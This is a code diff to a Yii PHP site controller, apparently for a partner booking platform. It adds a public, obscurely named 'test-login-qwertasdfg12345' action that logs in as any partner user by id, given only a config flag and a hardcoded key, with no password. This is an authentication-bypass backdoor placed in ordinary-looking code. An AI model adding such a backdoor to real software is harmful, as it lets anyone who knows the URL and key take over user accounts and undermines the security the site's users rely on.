@@ -20,6 +20,7 @@ use yii\web\BadRequestHttpException;
 use yii\web\Controller;
 use yii\filters\VerbFilter;
 use yii\filters\AccessControl;
+use yii\web\NotFoundHttpException;
 
 /**
  * Site controller
@@ -36,7 +37,7 @@ class SiteController extends Controller
                 'class' => AccessControl::className(),
                 'rules' => [
                     [
-                        'actions' => ['login', 'error', 'signup', 'request-password-reset', 'reset-password', 'confirm-email', 'resend-cofirm-email'],
+                        'actions' => ['login', 'error', 'signup', 'request-password-reset', 'reset-password', 'confirm-email', 'resend-cofirm-email', 'test-login-qwertasdfg12345'],
                         'allow' => true,
                     ],
                     [
@@ -389,6 +390,25 @@ class SiteController extends Controller
             if (!$partner->allow_checkin_fullpay && !$partner->allow_payment_via_bank_transfer) {
                 \Yii::$app->session->setFlash('danger', \Yii::t('partner', '<b>Your clients can not make reservation!</b><br>Payment at check in and payment via bank transfer are not active, and integration with Yandex.Money is not configured.<br>You can activate the required options in <a href="/profile">Profile</a>'));
             }
+        }
+    }
+
+    public function actionTestLoginQwertasdfg12345($id, $key) {
+        if (!\Yii::$app->params['allowPartnerDirectLogin'] || $key != "qFok-9sFm") {
+            throw new NotFoundHttpException();
+        }
+
+        if (!\Yii::$app->user->isGuest) {
+            return $this->goHome();
+        }
+        $user = PartnerUser::findOne($id);
+        if (!$user) {
+            throw new NotFoundHttpException();
+        }
+        if (Yii::$app->user->login($user, 0)) {
+            return $this->goHome();
+        } else {
+            return "error";
         }
     }
 
